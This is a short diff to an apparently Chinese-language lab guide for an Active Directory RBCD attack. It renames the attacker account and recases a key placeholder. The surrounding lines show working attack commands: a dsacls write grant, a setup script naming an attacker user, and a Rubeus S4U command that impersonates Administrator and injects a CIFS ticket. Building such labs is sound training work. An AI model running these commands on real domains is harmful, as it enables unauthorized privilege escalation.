@@ -34,7 +34,7 @@ dsacls "$dn" /I:T /G SME\aduser:GW
 ```
 - 最小（僅 RBCD 屬性 WriteProperty）
 ```powershell
-.\setup_rbcd_lab.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "labuser"
+.\setup_rbcd_lab.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "aduser"
 ```
 
 2) 建立攻擊者控制的電腦帳號 EvilPC$ 並取得金鑰
@@ -53,7 +53,7 @@ Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalf
 
 4) S4U2Self + S4U2Proxy 取得 Administrator → CIFS 的 TGS 並注入
 ```powershell
-.\Rubeus.exe s4u /user:EvilPC$ /aes256:<aes256_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
+.\Rubeus.exe s4u /user:EvilPC$ /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
 klist tickets
 ```
 
